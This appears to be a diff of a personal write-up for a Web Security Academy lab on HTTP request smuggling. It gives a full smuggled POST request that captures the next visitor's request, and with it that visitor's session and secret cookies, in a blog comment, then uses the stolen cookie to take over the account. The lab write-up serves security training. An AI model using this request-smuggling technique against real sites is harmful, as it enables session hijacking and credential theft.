@@ -4,24 +4,26 @@ exploit this lab on myself which wouldve solved the lab.
 first sending this request:
 "
 POST / HTTP/1.1
-Host: 0a6f0011037c31aa82e5ab18005500e6.web-security-academy.net
+Host: 0a6e0045032b4ea2832a1b7200c600c6.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 275
+Content-Length: 245
 Transfer-Encoding: chunked
 
 0
 
 POST /post/comment HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 252
-Cookie: session=ofgfLrvgkj34jzWuOUZHSa7Qd3RQE5ND
+Content-Length: 883
+Cookie: session=yLqdWnJe3PfREhsBSUbGgdrYBIWtqfGm
 
-csrf=kEUx7OlJpa1F1HmNStpBWXXdJcMjLNfm&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
-
+csrf=vlQVyG4fJR8LaQpQy3xUmcxBGwRyBzKw&postId=4&name=name&email=email@email.com&comment=
 "
 
-this then allows for the next users request, any request, to end up in my comment, giving the comment of:
-"testGET / HTTP/1.1 Host: 0a6f0011037c31aa82e5ab18005500e6.web-security-academy.net sec-ch-ua: "Google Chrome";v="119", "Chromium";v="11"
+this gets the next user request with the following:
 
-i could set the length of the content length higher to extract cookies and then log in as the user, which is how 
-to complete the lab... 
+Cookie: 
+victim-fingerprint=5wUEoM9SCPPbP3ejCtibLvzhv3aPBF25; 
+secret=gCPzZCkEQ4O7pxH8rFaWXlPgRyFRZnlT; 
+session=OxRbmycGUKkUQuBv3ZMv7HScZhldtU2M
+
+sending this as my cookie then solves the lab.
